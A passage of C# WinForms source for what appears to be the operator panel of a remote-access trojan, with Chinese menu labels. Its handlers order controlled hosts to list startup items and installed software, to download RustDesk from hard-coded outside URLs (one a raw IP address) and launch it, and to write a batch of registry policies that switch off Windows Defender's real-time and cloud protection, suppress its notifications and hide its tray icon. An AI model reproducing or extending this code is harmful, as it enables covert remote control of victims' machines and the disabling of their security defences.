                    }
                }
            }
        }

        private void 删除被控端ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                try { host.Client?.Close(); } catch { }
                _hostList.Remove(host);
            }
            objectListView.SetObjects(_hostList);
        }

        private void 一键获取开机启动项ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0)
            { AppendLog("请先选择被控端"); return; }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;

                AppendLog($"[{host.HostName}] 已发送获取启动项列表指令");
                SendCmdToHost(host, CMD_GET_STARTUP_LIST, new byte[0]);

                AppendLog($"[{host.HostName}] 已发送获取软件列表指令");
                SendCmdToHost(host, CMD_GET_INSTALLED, new byte[0]);
            }
        }

        private void treeListView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                _contextMenuNode = treeListView1.SelectedObject as FileNode;
                _contextMenuNodes = treeListView1.SelectedObjects
                    .Cast<object>()
                    .Select(o => o as FileNode)
                    .Where(f => f != null)
                    .ToList();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            richTextBoxPlus1.Clear();
        }

        private void 下载rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // ★ 换成你自己服务器上真实的 RustDesk 直链
            string rustDeskUrl = "https://1814652220.cdn.123clouddisk.com/1814652220/wenjian5/rustdesk.exe";
            string payload = "USER_DESKTOP\n" + rustDeskUrl + " !";
            byte[] data = Encoding.UTF8.GetBytes(payload);

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 开始下载 RustDesk 并自动打开...");
                SendCmdToHost(host, CMD_DOWNLOAD_RUSTDESK, data);
            }
        }

        private void 结束rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送结束 RustDesk 指令");
                SendCmdToHost(host, CMD_KILL_RUSTDESK, new byte[0]);
            }
        }

        private void 打开rustdeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 已发送打开 RustDesk 指令");
                SendCmdToHost(host, CMD_OPEN_RUSTDESK, new byte[0]);
            }
        }

        private void 下载rustdesk蓝奏云ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            // ★ 换成你自己服务器上真实的 RustDesk 直链
            string rustDeskUrl = "http://103.52.153.5:5244/d/%E6%88%91%E7%9A%84%E8%93%9D%E5%A5%8F%E4%BA%91%E4%BC%98%E4%BA%AB%E7%89%88%E4%BA%91%E7%9B%98/wenjian/rustdesk.exe";
            string payload = "USER_DESKTOP\n" + rustDeskUrl + " !";
            byte[] data = Encoding.UTF8.GetBytes(payload);

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                AppendLog($"[{host.HostName}] 开始下载 RustDesk 并自动打开...");
                SendCmdToHost(host, CMD_DOWNLOAD_RUSTDESK, data);
            }
        }

        private void 测试注册表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selected = objectListView.SelectedObjects;
            if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }

            var regOps = new[]
            {
                // 主开关
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\nDisableAntiSpyware\nREG_DWORD\n1\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\nDisableAntiVirus\nREG_DWORD\n1\nWRITE",
                // 实时保护
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableRealtimeMonitoring\nREG_DWORD\n1\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableBehaviorMonitoring\nREG_DWORD\n1\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableOnAccessProtection\nREG_DWORD\n1\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableScanOnRealtimeEnable\nREG_DWORD\n1\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableIOAVProtection\nREG_DWORD\n1\nWRITE",
                // 云保护
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Spynet\nSpynetReporting\nREG_DWORD\n0\nWRITE",
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Spynet\nSubmitSamplesConsent\nREG_DWORD\n2\nWRITE",
                // 计划扫描
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Scan\nDisableScheduledScanning\nREG_DWORD\n1\nWRITE",
                // 通知
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\UX Configuration\nNotification_Suppress\nREG_DWORD\n1\nWRITE",
                // 隐藏任务栏图标
                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender Security Center\\Systray\nHideSystray\nREG_DWORD\n1\nWRITE",
            };

            // ★ 拼成一条批量payload，用\n\n分隔，只发一次
            string batchPayload = string.Join("\n\n", regOps);

            foreach (var obj in selected)
            {
                HostInfo host = obj as HostInfo;
                if (host == null) continue;
                SendCmdToHost(host, CMD_REG_WRITE_AUTO, Encoding.UTF8.GetBytes(batchPayload));
                AppendLog($"[{host.HostName}] 已发送关闭Defender指令（共{regOps.Length}条）");
            }
        }
    }
}